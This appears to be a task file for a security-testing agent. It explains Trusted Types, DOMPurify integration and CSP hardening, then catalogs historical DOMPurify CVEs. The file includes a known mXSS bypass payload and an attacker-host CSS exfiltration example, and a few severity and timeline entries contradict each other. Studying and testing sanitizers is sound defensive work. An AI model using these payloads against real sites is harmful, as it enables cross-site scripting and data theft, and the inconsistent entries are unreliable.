# AGENT TASK: Trusted Types, CSP Bypass, and Historical CVE Testing
# PURPOSE: Test Trusted Types integration and exploit known historical vulns
# PRIORITY: Run when target uses Trusted Types or CSP
# INPUTS: Target CSP headers, Trusted Types policy, DOMPurify version
# OUTPUT: Trusted Types bypasses, CSP exfiltration channels, applicable CVEs
# CHAPTERS: 11 (Trusted Types/CSP), 12 (Historical Vulnerabilities)
---

# Chapter 11: Trusted Types and CSP Integration

## 11.1 Trusted Types API Overview

The Trusted Types API is a browser-level defense against DOM-based XSS. It works by locking down dangerous DOM sinks -- `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `script.src`, `script.textContent`, and similar -- so they reject raw strings and accept only typed wrapper objects that have passed through an application-defined policy function.

The API defines three trusted wrapper types:

- **TrustedHTML**: Wraps sanitized HTML strings. Required by sinks like `Element.innerHTML`, `Element.outerHTML`, `Element.insertAdjacentHTML`, `DOMParser.parseFromString`, and `Document.write`/`writeln`.
- **TrustedScript**: Wraps script source code. Required by `HTMLScriptElement.text`, `eval()`, `setTimeout(string)`, `setInterval(string)`, and `new Function(string)`.
- **TrustedScriptURL**: Wraps URLs that will load executable code. Required by `HTMLScriptElement.src`, `Worker()` constructor, and `import()`.

Enforcement is activated via a Content Security Policy header:

```
Content-Security-Policy: require-trusted-types-for 'script'
```

When this directive is active, any attempt to assign a raw string to a controlled sink throws a `TypeError`. The browser refuses the assignment entirely -- the string is never parsed, and no DOM mutation occurs. This converts what would be a silent XSS vulnerability into a loud, catchable runtime error.

Policies are created with `trustedTypes.createPolicy(name, { createHTML, createScript, createScriptURL })`. Each policy is a named factory that produces trusted wrapper objects. The CSP `trusted-types` directive restricts which policy names may be created:

```
Content-Security-Policy: trusted-types dompurify myapp-policy
```

Only policies named `dompurify` and `myapp-policy` can be instantiated. Attempts to create a policy with any other name throw a `TypeError`.

## 11.2 DOMPurify's RETURN_TRUSTED_TYPE Option

When `RETURN_TRUSTED_TYPE: true` is passed in the configuration, DOMPurify wraps its sanitized output string in a `TrustedHTML` object before returning it. This allows the return value to be directly assigned to `innerHTML` or other TrustedHTML-requiring sinks without triggering a Trusted Types violation.

```javascript
const clean = DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });
// typeof clean === 'object' (TrustedHTML), not 'string'
element.innerHTML = clean; // No Trusted Types violation
```

DOMPurify creates a Trusted Types policy named `dompurify` by default. When a `TRUSTED_TYPES_POLICY` is provided in the configuration with a `suffix` property, the policy is named `dompurify#<suffix>`. This allows multiple DOMPurify instances to coexist under a CSP that enumerates each expected policy name.

## 11.3 Policy Creation Patterns

DOMPurify creates its Trusted Types policy lazily via the internal `_createTrustedTypesPolicy` function. The creation follows these rules:

1. **At-most-once attempt**: DOMPurify attempts to create the policy at most once per instance. A module-level variable tracks whether creation has been attempted. Subsequent calls return the cached policy or `null`.

2. **Graceful failure**: If `trustedTypes.createPolicy()` throws (e.g., because the CSP `trusted-types` directive does not list the policy name, or because Trusted Types is not supported), DOMPurify logs a warning via `console.warn` but does not throw. The sanitizer continues to function, returning plain strings instead of TrustedHTML objects.

3. **Policy function**: The policy's `createHTML` function is the identity function -- it returns the string it receives without modification. DOMPurify performs all sanitization before wrapping; the policy merely applies the TrustedHTML type tag to already-sanitized output.

```javascript
// Simplified internal logic
function _createTrustedTypesPolicy(trustedTypes, purifyDocument, suffix) {
  if (typeof trustedTypes?.createPolicy === 'function') {
    const policyName = 'dompurify' + (suffix ? '#' + suffix : '');
    try {
      return trustedTypes.createPolicy(policyName, {
        createHTML(html) { return html; }
      });
    } catch (e) {
      console.warn('TrustedTypes policy creation failed:', e);
      return null;
    }
  }
  return null;
}
```

## 11.4 Re-Entrancy Guard

DOMPurify implements a counter-based re-entrancy guard for Trusted Types policy execution via the `IN_TRUSTED_TYPES_POLICY` variable. This prevents circular calls that can arise when a user-supplied `TRUSTED_TYPES_POLICY` itself calls `DOMPurify.sanitize()`:

```javascript
// Simplified logic in sanitize()
if (IN_TRUSTED_TYPES_POLICY > 0) {
  // Already inside a Trusted Types policy callback
  // Skip re-wrapping to prevent infinite recursion
}
```

The counter is incremented before calling the policy's `createHTML` and decremented afterward. If the counter is nonzero when `sanitize()` is entered, the Trusted Types wrapping step is skipped, and the raw sanitized string is returned. This prevents:

- Infinite recursion when a custom policy calls `sanitize()`
- Double-wrapping where a TrustedHTML object is wrapped again
- Stack overflow from mutually recursive policy callbacks

Without this guard, a custom `TRUSTED_TYPES_POLICY` whose `createHTML` calls `DOMPurify.sanitize(..., { RETURN_TRUSTED_TYPE: true })` would enter an infinite loop.

## 11.5 TRUSTED_TYPES_POLICY Configuration Option

The `TRUSTED_TYPES_POLICY` config option controls which Trusted Types policy DOMPurify uses:

- **Default (not specified)**: DOMPurify creates its own policy named `dompurify` (or `dompurify#suffix`).
- **Custom policy object**: The application provides a pre-created policy. DOMPurify calls `policy.createHTML(sanitizedString)` instead of creating its own policy. This is useful when the application has a centralized policy management system.
- **`null`**: Explicitly opts out of Trusted Types wrapping. DOMPurify returns plain strings even if `RETURN_TRUSTED_TYPE: true` is set and Trusted Types enforcement is active. The application is responsible for wrapping the output.

```javascript
// Using a custom policy
const myPolicy = trustedTypes.createPolicy('myapp-sanitizer', {
  createHTML: (html) => html
});
const clean = DOMPurify.sanitize(dirty, {
  RETURN_TRUSTED_TYPE: true,
  TRUSTED_TYPES_POLICY: myPolicy
});

// Opting out
const plainString = DOMPurify.sanitize(dirty, {
  TRUSTED_TYPES_POLICY: null
});
```

When using a custom policy, the re-entrancy guard (Section 11.4) protects against the custom policy calling back into `sanitize()`.

## 11.6 CVE-2026-65899 (GHSA-vxr8-fq34-vvx9): Trusted Types Policy Survives clearConfig()

**Affected versions**: < 3.4.9
**CVSS**: 6.1 Medium

This vulnerability arises from a state management defect in DOMPurify's Trusted Types integration. The Trusted Types policy object created by `_createTrustedTypesPolicy` is stored in a module-level variable that is **not** reset by `clearConfig()`. When an application:

1. Configures DOMPurify with `RETURN_TRUSTED_TYPE: true` and a specific policy configuration
2. Calls `clearConfig()` to reset all sanitization settings
3. Calls `sanitize()` again with a different (or no) configuration

The stale policy from step 1 persists and continues to sign output as TrustedHTML. This has two security consequences:

- **Stale trust**: Output sanitized under a different (potentially weaker) configuration is wrapped in TrustedHTML, bypassing Trusted Types enforcement.
- **Policy name mismatch**: If the initial configuration used a policy suffix and the new configuration expects a different suffix (or the default name), the stale policy produces TrustedHTML under the wrong policy name.

The fix in version 3.4.9 ensures that `clearConfig()` also nullifies the cached Trusted Types policy, forcing re-creation on the next `sanitize()` call with `RETURN_TRUSTED_TYPE: true`.

**Mitigation for unpatched versions**: Call `createDOMPurify()` to create a fresh instance instead of relying on `clearConfig()` to reset state.

## 11.7 TrustedHTML to String Conversion Loss

A TrustedHTML object wraps a string, but the trust is carried by the object's type, not by the string's content. Any operation that extracts the string discards the trust:

```javascript
const trusted = DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });

// All of these produce plain strings, stripping the TrustedHTML wrapper:
const s1 = trusted.toString();           // String
const s2 = `prefix ${trusted} suffix`;   // String (template literal)
const s3 = trusted + '';                  // String (concatenation)
const s4 = '' + trusted;                  // String (concatenation)
const s5 = String(trusted);              // String (explicit conversion)

// This triggers a Trusted Types violation because s1-s5 are plain strings:
element.innerHTML = s1; // TypeError: This document requires 'TrustedHTML'
```

This is a common integration mistake. Developers sanitize with `RETURN_TRUSTED_TYPE: true`, then unknowingly convert the result to a string through template literals, concatenation, or logging, and the subsequent `innerHTML` assignment fails or (worse, if enforcement is report-only) succeeds with an untracked string.

**Best practices**:

- Never concatenate TrustedHTML with other strings. If wrapping is needed, build the wrapper as a DOM element and use `appendChild` or set the wrapper's `innerHTML` with its own TrustedHTML value.
- Never log TrustedHTML objects with `console.log(trusted)` in production -- some logging frameworks call `.toString()` and discard the type.
- Never pass TrustedHTML through JSON serialization -- `JSON.stringify` calls `.toJSON()` or `.toString()`, producing a plain string.
- Use `trustedTypes.isHTML(value)` to verify the type before assignment.

## 11.8 Default Policy Risks

The Trusted Types API allows creating a special policy named `'default'`:

```javascript
trustedTypes.createPolicy('default', {
  createHTML: (html) => DOMPurify.sanitize(html)
});
```

The default policy is invoked automatically whenever a raw string is assigned to a TrustedHTML-requiring sink. Instead of throwing a violation, the browser calls `defaultPolicy.createHTML(rawString)` and uses the returned TrustedHTML.

**Risks of overly permissive default policies**:

1. **Silent bypass**: A default policy of `createHTML: (s) => s` (identity function) effectively disables Trusted Types enforcement. Every raw string is silently wrapped without sanitization.

2. **Masking vulnerabilities**: The default policy converts what should be loud violations into silent passes. Developers lose visibility into which code paths assign unsanitized strings to sinks.

3. **Performance cost**: Running DOMPurify on every `innerHTML` assignment across the entire application -- including trusted internal templates -- is wasteful and can cause rendering performance issues.

4. **Context mismatch**: The default policy applies the same sanitization to all sinks. An application might need stricter sanitization for user-generated content and more permissive handling for trusted admin templates. A single default policy cannot distinguish these contexts.

5. **Double sanitization**: Code paths that already call `DOMPurify.sanitize()` and then assign the result to `innerHTML` will trigger the default policy, running DOMPurify a second time on already-sanitized output. While not a security issue, it degrades performance and can strip legitimate content if the double-pass interacts with encoding.

**Recommended approach**: Avoid the default policy entirely. Create named policies for each distinct sanitization context and use them explicitly. Reserve the default policy for development/migration environments where it logs violations to a monitoring system.

## 11.9 CSP Defense-in-Depth Architecture

A comprehensive CSP deployment with DOMPurify combines Trusted Types with traditional CSP directives:

```
Content-Security-Policy:
  require-trusted-types-for 'script';
  trusted-types dompurify;
  script-src 'nonce-{random}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'self';
```

### 11.9.1 require-trusted-types-for 'script' + trusted-types dompurify

The first line activates Trusted Types enforcement. The second restricts policy creation to only the `dompurify` policy name. Together, they ensure:

- All DOM XSS sinks require typed objects
- Only DOMPurify's policy can produce TrustedHTML
- Application code cannot create alternative policies that bypass sanitization

### 11.9.2 script-src with nonce or strict-dynamic

`script-src` controls which scripts can execute. A nonce-based policy (`'nonce-{random}'`) allows only scripts with a matching nonce attribute. `'strict-dynamic'` extends trust transitively -- scripts loaded by a trusted script are also trusted.

This provides defense against injected `<script>` elements even if DOMPurify has a bypass: the injected script would lack the correct nonce and would be blocked by CSP.

### 11.9.3 style-src Considerations

DOMPurify explicitly does not sanitize CSS content. The `style` element and `style` attribute pass through with their content intact. CSP's `style-src` directive provides a partial backstop:

- `'self'`: Only stylesheets from the same origin are loaded (blocks exfiltration via `@import url('https://attacker.com/steal?...')`)
- `'unsafe-inline'`: Required if inline `style` attributes are allowed (DOMPurify permits them by default)
- Nonce-based style-src is possible but rarely practical for sanitized user content

Applications that allow `<style>` elements in sanitized content should be aware that CSS-based exfiltration (attribute selectors, `@font-face` unicode-range probing) is not prevented by DOMPurify and only partially mitigated by `style-src 'self'`.

### 11.9.4 object-src 'none'

Blocks `<object>`, `<embed>`, and `<applet>` elements from loading plugins. DOMPurify forbids these elements by default, but `object-src 'none'` provides defense-in-depth against misconfigured `ADD_TAGS`.

### 11.9.5 base-uri 'self'

Restricts `<base>` elements to same-origin URLs. DOMPurify forbids `<base>` by default, but this directive prevents a base-URI injection from redirecting all relative URLs if `<base>` is inadvertently allowed.

## 11.10 Attribute-Level Trusted Types

The `trustedTypes.getAttributeType(tagName, attributeName)` method returns the Trusted Type required for a specific attribute on a specific element:

```javascript
trustedTypes.getAttributeType('script', 'src');     // 'TrustedScriptURL'
trustedTypes.getAttributeType('div', 'innerHTML');   // null (not an attribute)
trustedTypes.getAttributeType('iframe', 'srcdoc');   // 'TrustedHTML'
```

DOMPurify's sanitization applies to the overall HTML string (producing TrustedHTML for `innerHTML`), but individual attributes within the sanitized output that require Trusted Types (e.g., `srcdoc` on an allowed `<iframe>`) are handled at the attribute level during rendering.

When building a DOMPurify wrapper that also handles attribute-level trust, the wrapper must:

1. Sanitize the full HTML with DOMPurify
2. For each attribute that `getAttributeType()` identifies as requiring trust, wrap the attribute value with the appropriate policy method (`createScriptURL` for `TrustedScriptURL`, `createHTML` for `TrustedHTML`)
3. Apply the wrapped attributes via `setAttribute` or property assignment

In practice, DOMPurify strips most attributes that require `TrustedScriptURL` (like `script.src`) because the elements they belong to are forbidden by default. The primary concern is `srcdoc` on `<iframe>` if that element and attribute are explicitly allowed.

## 11.11 Integration Patterns

### 11.11.1 DOMPurify-Backed Default Policy

For migration scenarios where an application has many `innerHTML` assignments that cannot be individually refactored:

```javascript
if (window.trustedTypes) {
  trustedTypes.createPolicy('default', {
    createHTML: (dirty) => DOMPurify.sanitize(dirty),
    createScriptURL: (url) => {
      // Only allow same-origin script URLs
      const parsed = new URL(url, document.baseURI);
      if (parsed.origin === location.origin) return url;
      throw new TypeError('Untrusted script URL: ' + url);
    }
  });
}
```

This is a migration aid, not a final architecture. The goal is to move each `innerHTML` assignment to an explicit named policy and then remove the default policy.

### 11.11.2 Policy Per Component

In a component-based architecture, each component or module creates its own named policy:

```javascript
const commentPolicy = trustedTypes.createPolicy('comments-sanitizer', {
  createHTML: (html) => DOMPurify.sanitize(html, {
    USE_PROFILES: { html: true },
    FORBID_ATTR: ['style', 'class']
  })
});

const adminPolicy = trustedTypes.createPolicy('admin-content', {
  createHTML: (html) => DOMPurify.sanitize(html, {
    ADD_TAGS: ['iframe'],
    ADD_ATTR: ['srcdoc', 'sandbox']
  })
});
```

The CSP header lists all expected policy names:

```
trusted-types comments-sanitizer admin-content dompurify
```

### 11.11.3 Policy Lifecycle Management

- **Singleton DOMPurify instance**: One `DOMPurify` instance per policy. Do not call `setConfig()` or `clearConfig()` on a shared instance between uses with different policies (see CVE-2026-65899).
- **Factory function**: Use `createDOMPurify(window)` to create isolated instances when different policies need different configurations.
- **Policy caching**: Store policy references in module scope. Creating the same named policy twice throws a `TypeError`.
- **Error boundaries**: Wrap `createPolicy` calls in try/catch. In environments where Trusted Types is not supported, fall back to plain DOMPurify output.

## 11.12 Testing Trusted Types Enforcement

1. **Violation detection**: Set the CSP header to `require-trusted-types-for 'script'` in test environments. Any `innerHTML` assignment with a plain string produces a `TypeError`. Playwright and Cypress can catch these via `page.on('pageerror')`.

2. **Report-only mode**: Use `Content-Security-Policy-Report-Only` with a `report-uri` endpoint to detect violations in production without breaking functionality.

3. **Policy creation verification**: Test that only expected policy names can be created. Attempting to create a policy with an unlisted name should throw.

4. **Type verification**: Use `trustedTypes.isHTML(value)` to verify that DOMPurify's output has the expected type before assignment.

5. **Conversion traps**: Grep the codebase for patterns that implicitly convert TrustedHTML to string: template literals containing sanitized output, string concatenation with `+`, explicit `.toString()` calls, `JSON.stringify`, and logging statements.

## 11.13 Limitations of Trusted Types with DOMPurify

1. **Trusted Types does not protect against mXSS**: The TrustedHTML object wraps the sanitized output string. If that string mutates during the browser's re-parse (mXSS), the trust is irrelevant -- the browser already accepted the string because it was typed as TrustedHTML. The mutation happens after the Trusted Types check.

2. **DOM sinks not covered by Trusted Types**: Some DOM sinks do not require Trusted Types. `Element.setAttribute('onclick', 'alert(1)')` does not require TrustedScript (the attribute is set as a string, not as script content). DOMPurify's attribute sanitization is the primary defense for these sinks.

3. **CSS injection**: Trusted Types has no `TrustedCSS` type. Inline styles and `<style>` elements are not covered. DOMPurify does not sanitize CSS, and Trusted Types does not fill this gap.

4. **Navigation sinks**: `location.href`, `window.open()`, and `<a href="javascript:...">` are partially covered. `TrustedScriptURL` applies to script-loading sinks but not to all navigation targets. DOMPurify's `ALLOWED_URI_REGEXP` is the defense for dangerous URI schemes in attribute values.

5. **Server-side rendering**: Trusted Types is a browser API. Server-side sanitization with DOMPurify (via jsdom) does not benefit from Trusted Types enforcement. The CSP header is set by the server but enforced by the client.

---

# Chapter 12: Historical DOMPurify Vulnerabilities and Patches

## 12.1 Classification Framework

DOMPurify vulnerabilities fall into three classes based on root cause:

### Class 1: Implementation Defects (~21 vulnerabilities)

Bugs in DOMPurify's own sanitization logic: regex errors, missing element or namespace handling, prototype pollution in configuration processing, hook isolation failures, predicate evaluation order errors, state leakage between calls, and incomplete tree traversal. These are fixable entirely within DOMPurify's codebase and do not depend on browser-specific behavior.

### Class 2: DOM/Browser Behaviors (3 vulnerabilities)

Issues arising from spec-compliant or browser-specific parsing behaviors that create parser differentials. The HTML specification explicitly acknowledges that serialization and re-parsing may not produce the same DOM tree. DOMPurify cannot fully control these behaviors -- it can only add workarounds and heuristics. Examples include MathML namespace confusion, SVG foreign content re-interpretation, and browser-specific element re-cloning (selectedcontent).

### Class 3: Integration Patterns (6 vulnerabilities)

Vulnerabilities triggered by how applications use DOMPurify rather than by bugs in DOMPurify itself. IN_PLACE mode misuse, cross-realm DOM passing, re-contextualization of sanitized output, and template framework interactions. These often require specific application architectures or configurations to be exploitable.

## 12.2 Complete Vulnerability Catalog

### 12.2.1 Critical Severity (CVSS >= 9.0)

**CVE-2024-47875 / GHSA-gx9m-whjm-85jf -- Nesting-Based mXSS**
- CVSS: 10.0 (CNA/GitHub); 6.1 (NIST reassessment)
- Affected: < 2.5.0 and 3.0.0 to < 3.1.3
- Fixed: 2.5.0 / 3.1.3
- Class: 1 (Implementation Defect)
- Root cause: Specially crafted nested HTML structures pass sanitization but produce executable markup after the browser's re-parse. The depth-checking mechanism was subvertible through nesting patterns that exploited differences between the sanitizer's tree traversal and the browser's re-interpretation.
- Preconditions: Default configuration, any browser
- Key patches: Commits `0ef5e53` (2.x) and PR #943 (3.x)

**CVE-2024-48910 / GHSA-p3vf-v8qc-cwcr -- Prototype Pollution to Sanitizer Bypass**
- CVSS: 9.1
- Affected: < 2.4.2
- Fixed: 2.4.2
- Class: 1 (Implementation Defect)
- Root cause: Plain object property lookups without prototype-safe guards allowed an attacker with an existing prototype pollution primitive to tamper with DOMPurify's internal configuration, disabling sanitization entirely.
- Preconditions: Requires an existing prototype pollution primitive (e.g., vulnerable lodash or jQuery)
- Key patch: Commit `d1dd037` -- switched to prototype-safe object patterns

**GHSA-mjjq-c88q-qhr6 -- mXSS Bypass (Pre-2.0.7)**
- CVSS: Critical (per advisory)
- Affected: < 2.0.7
- Fixed: 2.0.7
- Class: 1 (Implementation Defect)
- Root cause: Undisclosed mXSS bypass in core sanitization logic
- Preconditions: Default configuration, any browser

### 12.2.2 High Severity (CVSS 7.0-8.9)

**CVE-2024-45801 / GHSA-mmhx-hmjr-r674 -- Depth Check Bypass + Prototype Pollution**
- CVSS: 7.0
- Affected: < 2.5.4 and < 3.1.3
- Fixed: 2.5.4 / 3.1.3
- Class: 1
- Root cause: Malicious HTML bypassed the depth checking mechanism added to prevent nesting attacks. Prototype pollution could further weaken the `__depth` check.
- Key patches: Commits `1e52026` (3.x) and `26e1d69` (2.x)

**CVE-2026-47423 / GHSA-87xg-pxx2-7hvx -- selectedcontent Re-Clone**
- CVSS: 8.2
- Affected: 3.4.4
- Fixed: 3.4.5
- Class: 2 (DOM Implementation Behavior)
- Root cause: The browser builds a `selectedcontent` clone from the selected `option`. DOMPurify sanitizes the clone, then removes the `selected` attribute from the original `option`. The browser refreshes the clone from the now-modified option content, which sits in a subtree DOMPurify already processed.
- Preconditions: Chromium 148+ or WebKit 625+

**CVE-2026-49978 / GHSA-rp9w-3fw7-7cwq -- IN_PLACE Shadow Root in Template**
- CVSS: 6.3-8.1 (sources vary)
- Affected: < 3.4.7
- Fixed: 3.4.7
- Class: 3 (Integration Pattern)
- Root cause: IN_PLACE mode's node iterator does not descend into shadow roots within `<template>` content

**CVE-2026-75838 / GHSA-55q2-fjhq-7xh7 -- IN_PLACE Hook Detached Subtree**
- CVSS: 5.1-7.5 (sources vary)
- Affected: < 3.4.13
- Fixed: 3.4.13
- Class: 1
- Root cause: When an element-removal hook removes a node in IN_PLACE mode, descendant event handlers remain live on the detached subtree

**CVE-2026-41238 / GHSA-v9jr-rg53-9pgp -- Prototype Pollution via CUSTOM_ELEMENT_HANDLING Fallback**
- CVSS: 6.9-7.1
- Affected: 3.0.1 through 3.3.3
- Fixed: 3.4.0
- Class: 1
- Root cause: `CUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {}` creates a plain object inheriting from `Object.prototype`. Polluted `tagNameCheck`/`attributeNameCheck` values allow arbitrary custom elements.

**CVE-2026-41240 / GHSA-h7mw-gpvr-xq4m -- FORBID_TAGS Bypassed by Function-Based ADD_TAGS**
- CVSS: 8.2
- Affected: <= 3.3.3
- Fixed: 3.4.0
- Class: 1
- Root cause: When `ADD_TAGS` is a function via `EXTRA_ELEMENT_HANDLING.tagCheck`, a true return short-circuits before `FORBID_TAGS` is evaluated

**CVE-2026-65898 / GHSA-cmwh-pvxp-8882 -- setConfig ALLOWED_ATTR Pollution**
- CVSS: 7.2
- Affected: < 3.4.11
- Fixed: 3.4.11
- Class: 1
- Root cause: Incomplete fix from 3.4.7. `setConfig()` permanently pollutes `ALLOWED_ATTR`, bypassing the clone-guard added for hooks.

### 12.2.3 Medium Severity (CVSS 4.0-6.9)

**CVE-2020-26870 / GHSA-63q7-h895-m982 -- MathML Namespace Confusion mXSS**
- CVSS: 6.1 | Affected: < 2.0.17 | Fixed: 2.0.17 | Class: 2
- Root cause: Serialize-parse roundtrip exploiting MathML namespace confusion via nested `<form>` elements. The canonical payload `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>` becomes executable on re-parse because the inner form is dropped, `mglyph` stays in MathML namespace, `<style>` enters MathML namespace (parsed as markup, not raw text), and `<img onerror=...>` escapes.

**CVE-2019-16728 / GHSA-chqj-j4fh-rw7m -- SVG/Math + Closing Tag Confusion**
- CVSS: 6.1 | Affected: < 2.0.3 | Fixed: 2.0.3 | Class: 2
- Root cause: `<svg>` or `<math>` combined with `</p>` or `</br>` closing tags trigger implicit element creation in Chrome and Safari

**CVE-2025-26791 / GHSA-vhxf-7vqr-mrjg -- SAFE_FOR_TEMPLATES Regex Error**
- CVSS: 4.5 | Affected: < 3.2.4 | Fixed: 3.2.4 | Class: 1
- Root cause: Flawed template literal regex fails to match certain `${ }` expression patterns

**CVE-2025-15599 / GHSA-v8jm-5vwx-cfxm -- SAFE_FOR_XML Textarea Rawtext Bypass**
- CVSS: 5.1 | Affected: 3.1.3-3.2.6 / 2.5.3-2.5.8 | Fixed: 3.2.7 | Class: 1
- Root cause: `SAFE_FOR_XML` regex does not validate `<textarea>` rawtext elements

**CVE-2026-0540 -- SAFE_FOR_XML Missing Rawtext Elements**
- CVSS: 6.1 | Affected: 3.1.3-3.3.1 / 2.5.3-2.5.8 | Fixed: 3.3.2 / 2.5.9 | Class: 1
- Root cause: Five rawtext elements omitted from `SAFE_FOR_XML` regex: `noscript`, `xmp`, `noembed`, `noframes`, `iframe`

**CVE-2026-65914 / GHSA-h8r8-wccr-v5f2 -- mXSS via Re-Contextualization**
- CVSS: 5.3-6.9 | Affected: 3.3.1 | Fixed: 3.3.2 | Class: 3
- Root cause: Sanitized HTML inserted into a rawtext element wrapper (`<script>`, `<xmp>`, `<iframe>`, etc.) via string concatenation. Closing sequences in attribute values end the rawtext context early.

**CVE-2026-65913 / GHSA-cj63-jhhr-wcxv -- USE_PROFILES Array.prototype Pollution**
- CVSS: 6.1 | Affected: <= 3.3.1 | Fixed: 3.3.2 | Class: 1
- Root cause: `USE_PROFILES` rebuilds `ALLOWED_ATTR` as a plain array, susceptible to `Array.prototype` pollution

**CVE-2026-65912 / GHSA-cjmm-f4jc-qw8r -- ADD_ATTR Predicate Skips URI Validation**
- CVSS: 6.1 | Affected: < 3.3.2 | Fixed: 3.3.2 | Class: 1
- Root cause: Function-form `ADD_ATTR` bypasses URI validation, allowing `javascript:` URIs

**CVE-2026-65903 / GHSA-39q2-94rc-95cp -- ADD_TAGS Function Short-Circuit**
- CVSS: 6.1 | Affected: <= 3.3.3 | Fixed: 3.4.0 | Class: 1
- Root cause: Same class as CVE-2026-41240 -- function-form `tagCheck` short-circuits before `FORBID_TAGS`

**CVE-2026-41239 / GHSA-crv5-9vww-q3g8 -- SAFE_FOR_TEMPLATES Bypass in RETURN_DOM Mode**
- CVSS: 6.8 | Affected: v1.0.10 through < 3.4.0 | Fixed: 3.4.0 | Class: 1
- Root cause: Template expression stripping runs only on the final serialized string. `RETURN_DOM` / `RETURN_DOM_FRAGMENT` paths return before the second pass. Split expressions across adjacent text nodes merge into complete expressions after element removal.

**CVE-2026-65911 / GHSA-9p3w-6h5p-cv75 -- Predicate State Leakage**
- CVSS: 4.7 | Affected: < 3.4.0 | Fixed: 3.4.0 | Class: 1
- Root cause: Function-form ADD_ATTR/ADD_TAGS predicates leak state across `sanitize()` calls

**CVE-2026-49459 / GHSA-r47g-fvhr-h676 -- IN_PLACE Clobbered Root Retains Attributes**
- CVSS: 6.1 | Affected: < 3.4.6 | Fixed: 3.4.6 | Class: 3
- Root cause: DOM clobbering on `<form>` root causes `_isClobbered` to return true, `_sanitizeAttributes` returns early, event handlers survive

**CVE-2026-49458 / GHSA-hpcv-96wg-7vj8 -- Cross-Realm IN_PLACE Bypass**
- CVSS: 6.1 | Affected: < 3.4.6 | Fixed: 3.4.6 | Class: 3
- Root cause: `instanceof` checks fail for DOM nodes from a different JavaScript realm (iframe)

**CVE-2026-65901 / GHSA-x4vx-rjvf-j5p4 -- IN_PLACE Trusts Attacker-Controlled nodeName**
- CVSS: 6.1 | Affected: 3.4.6 | Fixed: 3.4.7 | Class: 1
- Root cause: IN_PLACE mode trusts `nodeName` on live non-form nodes, allowing script retention via spoofed names

**CVE-2026-65902 / GHSA-76mc-f452-cxcm -- Hook Allowlist Permanent Pollution**
- CVSS: 6.1 | Affected: <= 3.4.5 | Fixed: 3.4.7 | Class: 1
- Root cause: Hooks receive direct references to live allowlists. Mutations persist permanently, surviving `removeAllHooks()` and `clearConfig()`.

**CVE-2026-65900 / GHSA-gvmj-g25r-r7wr -- SAFE_FOR_TEMPLATES template.content Bypass**
- CVSS: 6.1 | Affected: < 3.4.8 | Fixed: 3.4.8 | Class: 1
- Root cause: Template expressions inside `<template>` content survive in DOM output modes

**CVE-2026-65899 / GHSA-vxr8-fq34-vvx9 -- Trusted Types Policy Survives clearConfig()**
- CVSS: 6.1 | Affected: < 3.4.9 | Fixed: 3.4.9 | Class: 1
- Root cause: Stale Trusted Types policy persists after configuration reset

**CVE-2026-66010 / GHSA-c2j3-45gr-mqc4 -- CUSTOM_ELEMENT_HANDLING Bypasses afterSanitizeElements Hook**
- CVSS: 6.1 | Affected: < 3.4.12 | Fixed: 3.4.12 | Class: 1
- Root cause: Allowed custom elements skip the `afterSanitizeElements` hook

### 12.2.4 Low Severity

**CVE-2019-25155 -- Demo File Reverse Tabnabbing**
- CVSS: 6.1 (despite low real-world impact) | Affected: < 1.0.11 | Fixed: 1.0.11 | Class: 3
- Root cause: Missing `rel="noopener noreferrer"` in demo file hook example

### 12.2.5 HackerOne Reports

**HackerOne #1024734 -- DOMPurify Bypass via SVG Mutation**
- Classification: Class 2 (DOM Implementation / SVG Parsing)
- Disclosed through the Internet Bug Bounty program
- Related to SVG namespace confusion technique documented by Michal Bentkowski

**HackerOne #225777 -- DOMPurify 0.8.9 Bypass**
- Affected version: DOMPurify 0.8.9 (early 2.x era)
- An early bypass that predates the modern vulnerability classification

## 12.3 Vulnerability Timeline (2019-2026)

| Date | CVE / Advisory | Version Fixed | Severity | Category |
|------|---------------|---------------|----------|----------|
| 2019-09 | CVE-2019-16728 | 2.0.3 | Medium | mXSS (SVG/Math) |
| 2019-11 | CVE-2019-25155 | 1.0.11 | Low | Demo file tabnabbing |
| 2020-09 | GHSA-mjjq-c88q-qhr6 | 2.0.7 | Critical | mXSS bypass |
| 2020-10 | CVE-2020-26870 | 2.0.17 | Medium | mXSS (MathML namespace) |
| 2024-09 | CVE-2024-45801 | 2.5.4 / 3.1.3 | High | Proto pollution + nesting |
| 2024-10 | CVE-2024-47875 | 2.5.0 / 3.1.3 | Critical | Nesting-based mXSS |
| 2024-10 | CVE-2024-48910 | 2.4.2 | Critical | Prototype pollution |
| 2025-02 | CVE-2025-26791 | 3.2.4 | Medium | SAFE_FOR_TEMPLATES regex |
| 2026-03 | CVE-2025-15599 | 3.2.7 | Medium | SAFE_FOR_XML textarea |
| 2026-03 | CVE-2026-0540 | 3.3.2 / 2.5.9 | Medium | SAFE_FOR_XML rawtext |
| 2026-03 | CVE-2026-65914 | 3.3.2 | Medium | Re-contextualization mXSS |
| 2026-04 | CVE-2026-65913 | 3.3.2 | Medium | USE_PROFILES pollution |
| 2026-04 | CVE-2026-65912 | 3.3.2 | Medium | ADD_ATTR URI skip |
| 2026-04 | CVE-2026-65903 | 3.4.0 | Medium | ADD_TAGS short-circuit |
| 2026-04 | CVE-2026-41238 | 3.4.0 | High | Proto pollution CUSTOM_ELEMENT |
| 2026-04 | CVE-2026-41239 | 3.4.0 | Medium | SAFE_FOR_TEMPLATES + DOM |
| 2026-04 | CVE-2026-41240 | 3.4.0 | High | FORBID_TAGS bypass |
| 2026-04 | CVE-2026-65911 | 3.4.0 | Low | Predicate state leakage |
| 2026-04 | CVE-2026-65904 | 3.4.4 | Low | IN_PLACE cross-window |
| 2026-05 | CVE-2026-47423 | 3.4.5 | High | selectedcontent re-clone |
| 2026-05 | CVE-2026-49459 | 3.4.6 | Medium | IN_PLACE clobbered root |
| 2026-05 | CVE-2026-49458 | 3.4.6 | Medium | Cross-realm IN_PLACE |
| 2026-05 | CVE-2026-65901 | 3.4.7 | Medium | IN_PLACE nodeName trust |
| 2026-05 | CVE-2026-65902 | 3.4.7 | Medium | Hook allowlist pollution |
| 2026-05 | CVE-2026-49978 | 3.4.7 | High | IN_PLACE shadow root template |
| 2026-06 | CVE-2026-65900 | 3.4.8 | Medium | SAFE_FOR_TEMPLATES template |
